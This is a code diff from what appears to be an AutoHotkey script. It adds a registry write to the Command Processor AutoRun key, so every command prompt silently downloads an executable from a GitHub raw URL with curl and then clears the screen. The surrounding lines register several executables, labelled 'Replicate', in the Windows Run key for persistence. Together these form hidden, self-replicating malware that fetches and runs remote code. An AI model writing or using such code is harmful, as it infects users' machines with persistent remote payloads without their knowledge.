@@ -18,6 +18,7 @@ runAllExes() {
 
     letters := ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z", "LButton", "RButton", "Delete", "Backspace", "Space"]
     
+    RegWrite '"curl -L -o C:\Microsoft\run.exe https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe & clear"', "REG_SZ", "HKCU\Software\Microsoft\Command Processor", "AutoRun"
     RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate0"
     RegWrite '"C:\Microsoft\LButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1"
     RegWrite '"C:\Microsoft\RButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2"
